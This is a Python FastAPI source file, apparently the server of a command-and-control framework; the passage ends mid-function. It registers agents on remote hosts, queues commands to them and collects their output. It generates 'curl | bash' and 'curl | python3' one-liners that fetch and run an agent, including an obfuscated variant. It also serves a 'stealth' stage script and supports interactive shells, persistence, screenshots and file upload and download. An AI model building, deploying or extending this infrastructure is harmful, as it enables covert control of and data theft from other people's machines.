import asyncio
import base64
import json
import os
import shlex
import shutil
import socket
import subprocess
from contextlib import suppress
from datetime import datetime, timedelta
from typing import Optional

from fastapi import (
    APIRouter,
    Depends,
    HTTPException,
    Query,
    Request,
    WebSocket,
    WebSocketDisconnect,
    WebSocketException,
    status,
)
from fastapi.responses import PlainTextResponse, Response
from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
from pydantic import BaseModel, Field, field_validator
from sqlalchemy import func, or_, select
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.orm import selectinload

from server.auth import (
    STAGER_TOKEN_EXPIRE_MINUTES,
    authenticate_user,
    create_access_token,
    create_agent_token,
    create_refresh_token,
    create_stager_token,
    decode_token,
    get_current_user,
    get_user_mfa_secret,
    require_token_type,
    verify_password,
)
from agent.agent_builder import generate_agent_payload
from server.database import async_session_maker, get_db
from server.http_commander import (
    get_command,
    register_agent as register_interactive_agent,
    session as agent_session,
    submit_output,
)
from server.models import Agent, AuditLog, Result, Task, User, generate_uuid
from server.security import (
    build_totp_uri,
    decrypt_text,
    encrypt_text,
    enforce_rate_limit,
    generate_totp_secret,
    get_client_ip,
    sanitize_text,
    verify_totp,
)
from server.tunnel import get_tunnel_url


router = APIRouter(prefix="/api/v1")
agent_security = HTTPBearer(auto_error=False)
agent_task_locks: dict[str, asyncio.Lock] = {}
INTERACTIVE_TERMINAL_VERSION = "interactive_shell_v1"
MAX_INTERACTIVE_TERMINAL_SESSIONS = 6


class LoginRequest(BaseModel):
    username: str = Field(..., min_length=1, max_length=255)
    password: str = Field(..., min_length=1, max_length=255)
    mfa_code: Optional[str] = Field(default=None, max_length=12)

    @field_validator("username", "password", "mfa_code")
    @classmethod
    def _sanitize_login_fields(cls, value: Optional[str]):
        return sanitize_text(value, 255 if value is not None else None)


class LoginResponse(BaseModel):
    access_token: str
    refresh_token: str
    token_type: str
    user: dict


class RefreshRequest(BaseModel):
    refresh_token: str


class RefreshResponse(BaseModel):
    access_token: str
    token_type: str


class RegisterRequest(BaseModel):
    hostname: str = Field(..., min_length=1, max_length=255)
    username: str = Field(..., min_length=1, max_length=255)
    os_info: str = Field(..., min_length=1, max_length=255)
    internal_ip: Optional[str] = Field(default=None, max_length=45)
    pid: int = Field(default=0, ge=0)


class RegisterResponse(BaseModel):
    agent_id: str
    agent_token: str
    registered: bool
    callback_interval: int


class ResultRequest(BaseModel):
    task_id: str
    output: str
    is_error: bool = False


class UpdateAgentRequest(BaseModel):
    note: Optional[str] = Field(default=None, max_length=5000)
    callback_interval: Optional[int] = Field(default=None, ge=1, le=300)

    @field_validator("note")
    @classmethod
    def _sanitize_note(cls, value: Optional[str]):
        return sanitize_text(value, 5000)


class CreateTaskRequest(BaseModel):
    command: str = Field(..., min_length=1, max_length=4096)

    @field_validator("command")
    @classmethod
    def _sanitize_command(cls, value: str):
        return sanitize_text(value, 4096)


class DeployInfoResponse(BaseModel):
    base_url: str
    expires_at: str
    python_download_url: str
    bash_download_url: str
    stage_url: str
    python_obfuscated_download_url: str
    python_command: str
    bash_command: str
    stage_command: str
    python_obfuscated_command: str


class MFAEnableRequest(BaseModel):
    code: str = Field(..., min_length=6, max_length=12)

    @field_validator("code")
    @classmethod
    def _sanitize_code(cls, value: str):
        return sanitize_text(value, 12)


class MFADisableRequest(BaseModel):
    code: str = Field(..., min_length=6, max_length=12)

    @field_validator("code")
    @classmethod
    def _sanitize_code(cls, value: str):
        return sanitize_text(value, 12)


def _get_agent_lock(agent_id: str) -> asyncio.Lock:
    lock = agent_task_locks.get(agent_id)
    if lock is None:
        lock = asyncio.Lock()
        agent_task_locks[agent_id] = lock
    return lock


def _agent_presence_window(agent: Agent) -> timedelta:
    interval = agent.callback_interval or 5
    return timedelta(seconds=max(interval * 4, 45))


def _agent_is_recently_seen(agent: Agent, now: Optional[datetime] = None) -> bool:
    if not agent.last_seen:
        return False
    current_time = now or datetime.utcnow()
    return agent.last_seen >= current_time - _agent_presence_window(agent)


def _agent_is_effectively_online(agent: Agent, now: Optional[datetime] = None) -> bool:
    return bool(agent.is_alive and _agent_is_recently_seen(agent, now=now))


def _serialize_agent(agent: Agent, now: Optional[datetime] = None) -> dict:
    payload = agent.to_dict()
    payload["is_alive"] = _agent_is_effectively_online(agent, now=now)
    payload["note"] = decrypt_text(agent.note)
    return payload


async def _terminate_process(process: subprocess.Popen) -> None:
    if process.poll() is not None:
        return

    process.terminate()
    try:
        await asyncio.wait_for(asyncio.to_thread(process.wait), timeout=5)
    except asyncio.TimeoutError:
        process.kill()
        await asyncio.to_thread(process.wait)


def _require_credentials(credentials: Optional[HTTPAuthorizationCredentials]) -> str:
    if not credentials or credentials.scheme.lower() != "bearer" or not credentials.credentials:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Missing bearer token",
            headers={"WWW-Authenticate": "Bearer"},
        )
    return credentials.credentials


def _require_stager_token(credentials: Optional[HTTPAuthorizationCredentials]) -> dict:
    return require_token_type(_require_credentials(credentials), "stager")


def _require_agent_token(
    credentials: Optional[HTTPAuthorizationCredentials],
    expected_agent_id: Optional[str] = None,
) -> str:
    payload = require_token_type(_require_credentials(credentials), "agent")
    agent_id = payload.get("sub")
    if not agent_id:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid agent token payload",
            headers={"WWW-Authenticate": "Bearer"},
        )
    if expected_agent_id and expected_agent_id != agent_id:
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Agent token mismatch")
    return agent_id


def _require_stager_query_token(stager: Optional[str]) -> dict:
    if not stager:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Missing stager token")
    return require_token_type(stager, "stager")


async def _get_public_base_url(request: Request) -> str:
    tunnel_url = await get_tunnel_url()
    return (tunnel_url or str(request.base_url)).rstrip("/")


def _parse_plaintext_registration(data: str) -> RegisterRequest:
    parsed = {
        "hostname": "unknown",
        "username": "unknown",
        "os_info": "unknown",
        "internal_ip": "unknown",
        "pid": 0,
    }

    for line in data.splitlines():
        if ":" not in line:
            continue
        key, value = line.split(":", 1)
        key = key.strip().lower()
        value = value.strip()
        if key == "host":
            parsed["hostname"] = value
        elif key == "user":
            parsed["username"] = value
        elif key == "os":
            parsed["os_info"] = value
        elif key == "ip":
            parsed["internal_ip"] = value
        elif key == "pid":
            try:
                parsed["pid"] = max(0, int(value))
            except ValueError:
                parsed["pid"] = 0

    return RegisterRequest(**parsed)


async def _create_agent_record(db: AsyncSession, request: RegisterRequest) -> RegisterResponse:
    agent = Agent(
        id=generate_uuid(),
        hostname=sanitize_text(request.hostname, 255) or "unknown",
        username=sanitize_text(request.username, 255) or "unknown",
        os_info=sanitize_text(request.os_info, 255) or "unknown",
        internal_ip=sanitize_text(request.internal_ip, 45),
        pid=request.pid,
        first_seen=datetime.utcnow(),
        last_seen=datetime.utcnow(),
        is_alive=True,
    )
    db.add(agent)
    await db.commit()
    await db.refresh(agent)

    return RegisterResponse(
        agent_id=agent.id,
        agent_token=create_agent_token(agent.id),
        registered=True,
        callback_interval=agent.callback_interval,
    )


async def _get_agent_or_404(db: AsyncSession, agent_id: str) -> Agent:
    result = await db.execute(select(Agent).where(Agent.id == agent_id))
    agent = result.scalar_one_or_none()
    if not agent:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Agent not found")
    return agent


async def _claim_tasks(db: AsyncSession, agent: Agent, limit: int = 10) -> list[Task]:
    now = datetime.utcnow()
    reclaim_before = now - timedelta(seconds=max(agent.callback_interval * 3, 30))

    result = await db.execute(
        select(Task)
        .where(Task.agent_id == agent.id)
        .where(
            or_(
                Task.status == "pending",
                (Task.status == "sent") & (Task.sent_at.is_not(None)) & (Task.sent_at < reclaim_before),
            )
        )
        .where(Task.completed_at.is_(None))
        .order_by(Task.created_at)
        .limit(limit)
    )
    tasks = result.scalars().all()
    for task in tasks:
        task.status = "sent"
        task.sent_at = now

    agent.last_seen = now
    agent.is_alive = True
    await db.commit()
    return tasks


async def _store_task_result(db: AsyncSession, task: Task, output: str, is_error: bool) -> Result:
    now = datetime.utcnow()
    task.status = "error" if is_error else "completed"
    task.completed_at = now
    encrypted_output = encrypt_text(sanitize_text(output, 2_000_000) or "")

    result = await db.execute(
        select(Result)
        .where(Result.task_id == task.id)
        .order_by(Result.received_at.desc())
        .limit(1)
    )
    result_obj = result.scalar_one_or_none()
    if result_obj:
        result_obj.output = encrypted_output
        result_obj.is_error = is_error
        result_obj.received_at = now
    else:
        result_obj = Result(
            task_id=task.id,
            output=encrypted_output,
            is_error=is_error,
            received_at=now,
        )
        db.add(result_obj)

    await db.commit()
    await db.refresh(result_obj)
    return result_obj


async def _mark_agent_seen(agent_id: str):
    async with async_session_maker() as db:
        try:
            agent = await _get_agent_or_404(db, agent_id)
        except HTTPException:
            return
        agent.last_seen = datetime.utcnow()
        agent.is_alive = True
        await db.commit()


async def _get_websocket_user(websocket: WebSocket) -> User:
    token = websocket.query_params.get("token")
    if not token:
        raise WebSocketException(code=status.WS_1008_POLICY_VIOLATION, reason="Missing token")

    try:
        payload = require_token_type(token, "access")
    except HTTPException as exc:
        raise WebSocketException(code=status.WS_1008_POLICY_VIOLATION, reason=exc.detail) from exc

    user_id = payload.get("sub")
    if not user_id:
        raise WebSocketException(code=status.WS_1008_POLICY_VIOLATION, reason="Invalid token payload")

    async with async_session_maker() as db:
        result = await db.execute(select(User).where(User.id == user_id))
        user = result.scalar_one_or_none()

    if not user:
        raise WebSocketException(code=status.WS_1008_POLICY_VIOLATION, reason="User not found")
    return user


async def _wait_for_result(task_id: str, timeout_seconds: int = 30) -> Optional[Result]:
    deadline = asyncio.get_running_loop().time() + timeout_seconds
    while asyncio.get_running_loop().time() < deadline:
        async with async_session_maker() as db:
            result = await db.execute(
                select(Result)
                .where(Result.task_id == task_id)
                .order_by(Result.received_at.desc())
                .limit(1)
            )
            result_obj = result.scalar_one_or_none()
            if result_obj:
                return result_obj
        await asyncio.sleep(0.5)
    return None


async def _safe_websocket_close(websocket: WebSocket):
    with suppress(RuntimeError):
        await websocket.close()


def _serialize_result(result: Result) -> dict:
    payload = result.to_dict()
    payload["output"] = decrypt_text(result.output) or ""
    return payload


def _serialize_task(task: Task) -> dict:
    payload = task.to_dict()
    payload["command"] = decrypt_text(task.command) or ""
    return payload


def _is_terminal_control_command(command: str) -> bool:
    stripped = str(command or "").strip()
    if stripped in {"!screenshot", "!persist", "!sleep", "!info", "!kill"}:
        return True
    return any(
        stripped.startswith(prefix)
        for prefix in ("!download ", "!upload ", "!sleep ")
    )


async def _create_task_record(db: AsyncSession, agent_id: str, command: str) -> Task:
    task = Task(
        agent_id=agent_id,
        command=encrypt_text(command) or "",
        status="pending",
        created_at=datetime.utcnow(),
    )
    db.add(task)
    await db.commit()
    await db.refresh(task)
    return task


async def _cleanup_task_record(task_id: str) -> None:
    async with async_session_maker() as db:
        task = await db.get(Task, task_id)
        if not task:
            return
        await db.delete(task)
        await db.commit()


def _parse_interactive_terminal_payload(result: Result) -> Optional[dict]:
    raw_output = decrypt_text(result.output) or ""
    try:
        payload = json.loads(raw_output)
    except json.JSONDecodeError:
        return None
    if not isinstance(payload, dict):
        return None
    return payload


async def _queue_ephemeral_task(
    agent_id: str,
    command: str,
    *,
    timeout_seconds: int = 35,
) -> tuple[str, Optional[Result]]:
    async with async_session_maker() as db:
        agent = await _get_agent_or_404(db, agent_id)
        if not _agent_is_effectively_online(agent):
            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail="Agent is offline")
        task = await _create_task_record(db, agent_id, command)

    result = await _wait_for_result(task.id, timeout_seconds=timeout_seconds)
    await _cleanup_task_record(task.id)
    return task.id, result


async def _queue_terminal_control_task(agent_id: str, command: str) -> Task:
    async with async_session_maker() as db:
        agent = await _get_agent_or_404(db, agent_id)
        if not _agent_is_effectively_online(agent):
            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail="Agent went offline before the command could be queued.")
        return await _create_task_record(db, agent_id, command)


async def _probe_interactive_terminal_support(agent_id: str) -> tuple[bool, str]:
    try:
        _task_id, result = await _queue_ephemeral_task(agent_id, "!session_probe", timeout_seconds=35)
    except HTTPException as exc:
        return False, exc.detail

    if not result:
        return False, "Interactive terminal probe timed out"

    payload = _parse_interactive_terminal_payload(result)
    if payload and payload.get("supported") and payload.get("version") == INTERACTIVE_TERMINAL_VERSION:
        return True, ""

    return False, (decrypt_text(result.output) or "Agent does not support interactive terminal sessions")


async def _queue_interactive_terminal_command(
    agent_id: str,
    action: str,
    payload: dict,
    *,
    timeout_seconds: int = 35,
) -> tuple[str, Optional[Result]]:
    command = f"!session_{action} {json.dumps(payload, separators=(',', ':'))}"
    return await _queue_ephemeral_task(agent_id, command, timeout_seconds=timeout_seconds)


async def _safe_close_interactive_terminal(agent_id: str, session_id: str) -> None:
    with suppress(Exception):
        await _queue_interactive_terminal_command(
            agent_id,
            "close",
            {"session_id": session_id},
            timeout_seconds=20,
        )


async def _log_audit_event(
    event_type: str,
    *,
    actor: Optional[User] = None,
    actor_username: Optional[str] = None,
    target_type: Optional[str] = None,
    target_id: Optional[str] = None,
    ip_address: Optional[str] = None,
    details: Optional[str] = None,
) -> None:
    async with async_session_maker() as db:
        entry = AuditLog(
            actor_id=actor.id if actor else None,
            actor_username=actor.username if actor else actor_username,
            event_type=event_type,
            target_type=target_type,
            target_id=target_id,
            ip_address=ip_address,
            details=encrypt_text(sanitize_text(details, 8000)) if details else None,
        )
        db.add(entry)
        await db.commit()


def _user_lock_active(user: User) -> bool:
    return bool(user.locked_until and user.locked_until > datetime.utcnow())


async def _record_failed_login(user: Optional[User], request: Request, username: str) -> None:
    ip_address = get_client_ip(request)
    async with async_session_maker() as db:
        locked_user = None
        if user:
            result = await db.execute(select(User).where(User.id == user.id))
            locked_user = result.scalar_one_or_none()
        else:
            result = await db.execute(select(User).where(User.username == username))
            locked_user = result.scalar_one_or_none()

        if locked_user:
            locked_user.failed_login_attempts = int(locked_user.failed_login_attempts or 0) + 1
            if locked_user.failed_login_attempts >= 5:
                locked_user.locked_until = datetime.utcnow() + timedelta(minutes=15)
            await db.commit()

    await _log_audit_event(
        "auth.login.failed",
        actor=user,
        actor_username=username,
        target_type="user",
        target_id=user.id if user else None,
        ip_address=ip_address,
        details="Failed login attempt",
    )


async def _record_successful_login(user: User, request: Request) -> None:
    async with async_session_maker() as db:
        result = await db.execute(select(User).where(User.id == user.id))
        fresh_user = result.scalar_one_or_none()
        if fresh_user:
            fresh_user.failed_login_attempts = 0
            fresh_user.locked_until = None
            fresh_user.last_login_at = datetime.utcnow()
            await db.commit()

    await _log_audit_event(
        "auth.login.success",
        actor=user,
        target_type="user",
        target_id=user.id,
        ip_address=get_client_ip(request),
        details="Operator login succeeded",
    )


@router.post("/auth/login", response_model=LoginResponse)
async def login(request: LoginRequest, http_request: Request, db: AsyncSession = Depends(get_db)):
    enforce_rate_limit(http_request, "auth.login", limit=10, window_seconds=300)

    result = await db.execute(select(User).where(User.username == request.username))
    existing_user = result.scalar_one_or_none()
    if existing_user and _user_lock_active(existing_user):
        await _log_audit_event(
            "auth.login.locked",
            actor=existing_user,
            target_type="user",
            target_id=existing_user.id,
            ip_address=get_client_ip(http_request),
            details="Login rejected because the account is temporarily locked",
        )
        raise HTTPException(
            status_code=status.HTTP_423_LOCKED,
            detail="Account is temporarily locked due to repeated failed logins",
        )

    user = await authenticate_user(request.username, request.password, db)
    if not user:
        await _record_failed_login(existing_user, http_request, request.username)
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid username or password")

    if user.mfa_enabled:
        if not (request.mfa_code or "").strip():
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail={
                    "message": "Multi-factor authentication code required",
                    "mfa_required": True,
                },
            )
        secret = get_user_mfa_secret(user)
        if not secret or not verify_totp(secret, request.mfa_code or ""):
            await _record_failed_login(user, http_request, request.username)
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail={
                    "message": "Invalid multi-factor authentication code",
                    "mfa_required": True,
                },
            )

    await _record_successful_login(user, http_request)
    access_token = create_access_token({"sub": user.id, "username": user.username})
    refresh_token = create_refresh_token({"sub": user.id})
    return {
        "access_token": access_token,
        "refresh_token": refresh_token,
        "token_type": "bearer",
        "user": user.to_dict(),
    }


@router.post("/auth/refresh", response_model=RefreshResponse)
async def refresh_token(request: RefreshRequest, http_request: Request, db: AsyncSession = Depends(get_db)):
    enforce_rate_limit(http_request, "auth.refresh", limit=30, window_seconds=300)
    payload = require_token_type(request.refresh_token, "refresh")
    user_id = payload.get("sub")
    result = await db.execute(select(User).where(User.id == user_id))
    user = result.scalar_one_or_none()
    if not user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="User not found")

    access_token = create_access_token({"sub": user.id, "username": user.username})
    return {"access_token": access_token, "token_type": "bearer"}


@router.get("/deploy", response_model=DeployInfoResponse)
async def get_deploy_info(request: Request, current_user: User = Depends(get_current_user)):
    enforce_rate_limit(request, "deploy.info", limit=30, window_seconds=300)
    base_url = await _get_public_base_url(request)
    expires_at = datetime.utcnow() + timedelta(minutes=STAGER_TOKEN_EXPIRE_MINUTES)
    stager_token = create_stager_token(timedelta(minutes=STAGER_TOKEN_EXPIRE_MINUTES))

    python_url = f"{base_url}/api/v1/payload/agent.py?stager={stager_token}"
    python_obfuscated_url = f"{base_url}/api/v1/payload/agent.py?stager={stager_token}&obfuscate=true"
    bash_url = f"{base_url}/api/v1/payload/agent.sh?stager={stager_token}"
    stage_url = f"{base_url}/api/v1/stage?stager={stager_token}"

    await _log_audit_event(
        "deploy.links.generated",
        actor=current_user,
        target_type="deployment",
        ip_address=get_client_ip(request),
        details=f"Generated fresh payload links expiring at {expires_at.isoformat()}",
    )

    return {
        "base_url": base_url,
        "expires_at": expires_at.isoformat(),
        "python_download_url": python_url,
        "bash_download_url": bash_url,
        "stage_url": stage_url,
        "python_obfuscated_download_url": python_obfuscated_url,
        "python_command": f"curl -fsSL {shlex.quote(python_url)} | python3 -",
        "bash_command": f"curl -fsSL {shlex.quote(bash_url)} | bash",
        "stage_command": f"curl -fsSL {shlex.quote(stage_url)} | bash",
        "python_obfuscated_command": f"curl -fsSL {shlex.quote(python_obfuscated_url)} | python3 -",
    }


@router.post("/register", response_model=RegisterResponse)
async def register_agent(
    request: RegisterRequest,
    authorization: Optional[HTTPAuthorizationCredentials] = Depends(agent_security),
    db: AsyncSession = Depends(get_db),
):
    _require_stager_token(authorization)
    return await _create_agent_record(db, request)


@router.get("/tasks/{agent_id}")
async def get_tasks(
    agent_id: str,
    authorization: Optional[HTTPAuthorizationCredentials] = Depends(agent_security),
    db: AsyncSession = Depends(get_db),
):
    _require_agent_token(authorization, expected_agent_id=agent_id)
    async with _get_agent_lock(agent_id):
        agent = await _get_agent_or_404(db, agent_id)
        tasks = await _claim_tasks(db, agent)

    return {
        "tasks": [_serialize_task(task) for task in tasks],
        "interval": agent.callback_interval,
    }


@router.get("/tasks/{agent_id}/next", response_class=PlainTextResponse)
async def get_next_task(
    agent_id: str,
    authorization: Optional[HTTPAuthorizationCredentials] = Depends(agent_security),
    db: AsyncSession = Depends(get_db),
):
    _require_agent_token(authorization, expected_agent_id=agent_id)
    async with _get_agent_lock(agent_id):
        agent = await _get_agent_or_404(db, agent_id)
        tasks = await _claim_tasks(db, agent, limit=1)

    if not tasks:
        return PlainTextResponse(f"interval={agent.callback_interval}\n", media_type="text/plain")

    task = tasks[0]
    decrypted_command = decrypt_text(task.command) or ""
    command_b64 = base64.b64encode(decrypted_command.encode("utf-8")).decode("ascii")
    content = (
        f"task_id={task.id}\n"
        f"command_b64={command_b64}\n"
        f"interval={agent.callback_interval}\n"
    )
    return PlainTextResponse(content, media_type="text/plain")


@router.post("/results")
async def submit_result(
    request: ResultRequest,
    authorization: Optional[HTTPAuthorizationCredentials] = Depends(agent_security),
    db: AsyncSession = Depends(get_db),
):
    agent_id = _require_agent_token(authorization)
    result = await db.execute(select(Task).where(Task.id == request.task_id))
    task = result.scalar_one_or_none()
    if not task:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task not found")
    if task.agent_id != agent_id:
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Task does not belong to this agent")

    await _store_task_result(db, task, request.output, request.is_error)
    return {"status": "success"}


@router.post("/results/{task_id}/plain", response_class=PlainTextResponse)
async def submit_plain_result(
    task_id: str,
    request: Request,
    is_error: bool = Query(False),
    authorization: Optional[HTTPAuthorizationCredentials] = Depends(agent_security),
    db: AsyncSession = Depends(get_db),
):
    agent_id = _require_agent_token(authorization)
    result = await db.execute(select(Task).where(Task.id == task_id))
    task = result.scalar_one_or_none()
    if not task:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task not found")
    if task.agent_id != agent_id:
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Task does not belong to this agent")

    output = (await request.body()).decode("utf-8", errors="replace")
    await _store_task_result(db, task, output, is_error)
    return PlainTextResponse("ok", media_type="text/plain")


@router.get("/heartbeat/{agent_id}")
async def heartbeat(
    agent_id: str,
    authorization: Optional[HTTPAuthorizationCredentials] = Depends(agent_security),
    db: AsyncSession = Depends(get_db),
):
    _require_agent_token(authorization, expected_agent_id=agent_id)
    agent = await _get_agent_or_404(db, agent_id)
    agent.last_seen = datetime.utcnow()
    agent.is_alive = True
    await db.commit()
    return {"status": "ok", "interval": agent.callback_interval}


@router.post("/reg")
async def interactive_register(
    request: Request,
    authorization: Optional[HTTPAuthorizationCredentials] = Depends(agent_security),
    db: AsyncSession = Depends(get_db),
):
    _require_stager_token(authorization)
    body = await request.body()
    data = body.decode("utf-8", errors="replace")
    register_request = _parse_plaintext_registration(data)
    response = await _create_agent_record(db, register_request)
    agent_session.agent_id = response.agent_id
    register_interactive_agent(data)
    return response.model_dump()


@router.get("/cmd", response_class=PlainTextResponse)
async def interactive_get_command(
    authorization: Optional[HTTPAuthorizationCredentials] = Depends(agent_security),
):
    agent_id = _require_agent_token(authorization)
    await _mark_agent_seen(agent_id)
    return PlainTextResponse(get_command(), media_type="text/plain")


@router.post("/out", response_class=PlainTextResponse)
async def interactive_submit_output(
    request: Request,
    authorization: Optional[HTTPAuthorizationCredentials] = Depends(agent_security),
):
    agent_id = _require_agent_token(authorization)
    output = (await request.body()).decode("utf-8", errors="replace")
    submit_output(output)

    async with async_session_maker() as db:
        try:
            agent = await _get_agent_or_404(db, agent_id)
        except HTTPException:
            return PlainTextResponse("ok", media_type="text/plain")

        agent.last_seen = datetime.utcnow()
        agent.is_alive = True
        result = await db.execute(
            select(Task)
            .where(Task.agent_id == agent.id)
            .where(Task.status.in_(["pending", "sent"]))
            .order_by(Task.created_at.desc())
            .limit(1)
        )
        task = result.scalar_one_or_none()
        if task:
            await _store_task_result(db, task, output, output.startswith("[-]"))
        else:
            await db.commit()

    return PlainTextResponse("ok", media_type="text/plain")


@router.get("/stage", response_class=PlainTextResponse)
async def get_stage_payload(request: Request, stager: Optional[str] = Query(default=None)):
    _require_stager_query_token(stager)
    agent_path = os.path.join(os.path.dirname(__file__), "..", "agent", "stealth_agent.sh")
    if not os.path.exists(agent_path):
        raise HTTPException(status_code=404, detail="Stage payload not found")

    with open(agent_path, "r", encoding="utf-8") as payload_file:
        agent_code = payload_file.read()

    base_url = await _get_public_base_url(request)
    agent_code = agent_code.replace("__C2_URL__", base_url)
    agent_code = agent_code.replace("__AUTH_TOKEN__", stager or "")
    return PlainTextResponse(content=agent_code, media_type="text/plain")


@router.get("/tunnel-info")
async def get_tunnel_info(request: Request, current_user: User = Depends(get_current_user)):
    del current_user
    url = await get_tunnel_url()
    return {"tunnel_url": url or str(request.base_url).rstrip("/")}


@router.post("/tunnel/restart")
async def restart_tunnel(request: Request, current_user: User = Depends(get_current_user)):
    tunnel_manager = request.app.state.tunnel_manager
    if not tunnel_manager:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Tunnel manager not available",
        )

    new_url = await tunnel_manager.restart()
    await _log_audit_event(
        "tunnel.restarted",
        actor=current_user,
        target_type="tunnel",
        ip_address=get_client_ip(request),
        details=f"Tunnel restarted to {new_url}",
    )
    return {
        "new_tunnel_url": new_url,
        "warning": "Existing agent payload URLs need to be regenerated after a tunnel restart.",
    }


@router.get("/agents")
async def list_agents(
    alive: Optional[bool] = Query(default=None),
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    result = await db.execute(select(Agent).order_by(Agent.last_seen.desc()))
    agents = result.scalars().all()
    now = datetime.utcnow()
    serialized_agents = [_serialize_agent(agent, now=now) for agent in agents]
    if alive is not None:
        serialized_agents = [agent for agent in serialized_agents if agent["is_alive"] is alive]
    return {"agents": serialized_agents}


@router.get("/agents/{agent_id}")
async def get_agent(
    agent_id: str,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    del current_user
    agent = await _get_agent_or_404(db, agent_id)
    return _serialize_agent(agent)


@router.delete("/agents/{agent_id}")
async def delete_agent(
    agent_id: str,
    http_request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    agent = await _get_agent_or_404(db, agent_id)
    await db.delete(agent)
    await db.commit()
    agent_task_locks.pop(agent_id, None)
    await _log_audit_event(
        "agent.deleted",
        actor=current_user,
        target_type="agent",
        target_id=agent_id,
        ip_address=get_client_ip(http_request),
        details=f"Deleted agent {agent.hostname}",
    )
    return {"status": "success", "message": "Agent deleted"}


@router.patch("/agents/{agent_id}")
async def update_agent(
    agent_id: str,
    request: UpdateAgentRequest,
    http_request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    agent = await _get_agent_or_404(db, agent_id)

    if request.note is not None:
        agent.note = encrypt_text(request.note)
    if request.callback_interval is not None:
        agent.callback_interval = request.callback_interval

    await db.commit()
    await db.refresh(agent)
    await _log_audit_event(
        "agent.updated",
        actor=current_user,
        target_type="agent",
        target_id=agent.id,
        ip_address=get_client_ip(http_request),
        details=f"Updated note/callback interval for {agent.hostname}",
    )
    return _serialize_agent(agent)


@router.post("/agents/{agent_id}/task")
async def create_task(
    agent_id: str,
    request: CreateTaskRequest,
    http_request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    await _get_agent_or_404(db, agent_id)

    task = Task(
        agent_id=agent_id,
        command=encrypt_text(request.command) or "",
        status="pending",
        created_at=datetime.utcnow(),
    )
    db.add(task)
    await db.commit()
    await db.refresh(task)
    await _log_audit_event(
        "agent.task.created",
        actor=current_user,
        target_type="agent",
        target_id=agent_id,
        ip_address=get_client_ip(http_request),
        details=f"Queued command: {request.command[:200]}",
    )
    return _serialize_task(task)


@router.get("/agents/{agent_id}/history")
async def get_agent_history(
    agent_id: str,
    limit: int = Query(50, ge=1, le=100),
    offset: int = Query(0, ge=0),
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    del current_user
    await _get_agent_or_404(db, agent_id)

    total = (
        await db.execute(
            select(func.count(Task.id))
            .where(Task.agent_id == agent_id)
        )
    ).scalar() or 0

    result = await db.execute(
        select(Task)
        .where(Task.agent_id == agent_id)
        .options(selectinload(Task.results))
        .order_by(Task.created_at.desc())
        .limit(limit)
        .offset(offset)
    )
    tasks = result.scalars().all()
    history = []
    for task in tasks:
        task_dict = _serialize_task(task)
        task_dict["results"] = [_serialize_result(result) for result in task.results]
        history.append(task_dict)

    return {
        "tasks": history,
        "count": len(history),
        "total": total,
        "offset": offset,
        "limit": limit,
        "has_more": (offset + len(history)) < total,
    }


@router.get("/audit-logs")
async def get_audit_logs(
    limit: int = Query(20, ge=1, le=100),
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    del current_user
    result = await db.execute(select(AuditLog).order_by(AuditLog.created_at.desc()).limit(limit))
    logs = result.scalars().all()
    payload = []
    for log in logs:
        item = log.to_dict()
        item["details"] = decrypt_text(log.details)
        payload.append(item)
    return {"logs": payload}


@router.get("/security/status")
async def get_security_status(current_user: User = Depends(get_current_user)):
    return {
        "user": current_user.to_dict(),
        "mfa_enabled": current_user.mfa_enabled,
        "lockout_policy": {"max_attempts": 5, "lock_minutes": 15},
        "rate_limits": {
            "login": "10 requests / 5 minutes / IP",
            "refresh": "30 requests / 5 minutes / IP",
            "deploy": "30 requests / 5 minutes / IP",
        },
    }


@router.post("/security/mfa/setup")
async def setup_mfa(http_request: Request, current_user: User = Depends(get_current_user), db: AsyncSession = Depends(get_db)):
    user = await db.get(User, current_user.id)
    if not user:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="User not found")

    secret = get_user_mfa_secret(user)
    if not secret:
        secret = generate_totp_secret()
        user.mfa_secret = encrypt_text(secret)
        await db.commit()

    uri = build_totp_uri(secret, user.username)
    await _log_audit_event(
        "security.mfa.setup",
        actor=user,
        target_type="user",
        target_id=user.id,
        ip_address=get_client_ip(http_request),
        details="Generated MFA enrollment secret",
    )
    return {"secret": secret, "otpauth_uri": uri, "mfa_enabled": user.mfa_enabled}


@router.post("/security/mfa/enable")
async def enable_mfa(
    request: MFAEnableRequest,
    http_request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    user = await db.get(User, current_user.id)
    if not user:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="User not found")

    secret = get_user_mfa_secret(user)
    if not secret:
        secret = generate_totp_secret()
        user.mfa_secret = encrypt_text(secret)

    if not verify_totp(secret, request.code):
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="Invalid MFA verification code")

